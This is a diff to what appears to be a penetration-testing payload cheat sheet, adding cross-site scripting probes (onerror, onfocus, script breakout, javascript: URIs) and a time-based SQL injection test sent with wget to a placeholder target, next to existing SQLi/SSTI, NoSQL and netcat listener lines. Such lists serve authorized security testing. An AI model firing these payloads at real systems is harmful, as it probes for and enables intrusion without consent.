@@ -28,6 +28,14 @@ Payloads examples
 Fairly short, and will give indicators of basic SQLi, XSS and SSTI vulnerabilities
 <pre>'"&gt;&lt;svg/onload=alert()>{{7*7}}
 </pre>
+XSS. Try it on URL query, fragment & path. All input fields.
+<pre>"&gt;&lt;img src onerror=alert(1)&gt;
+"autofocus onfocus=alert(1)//
+&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+'-alert(1)-'
+\'-alert(1)//
+javascript:alert(1)
+</pre>
 Reverse check request by nc
 <pre>nc -lvvp 1333
 </pre>
@@ -67,6 +75,9 @@ LDAP injections
 </pre>
 NoSQL injections
 <pre>?login[$regex]=.{*}&pass[$ne]=123
+</pre>
+
+<pre>time wget -qO- "TARGET/page?p=1;waitfor+delay'0:0:5'--&p=1/*%21and+sleep(5)*/#" 
 </pre>
 
 <hr>
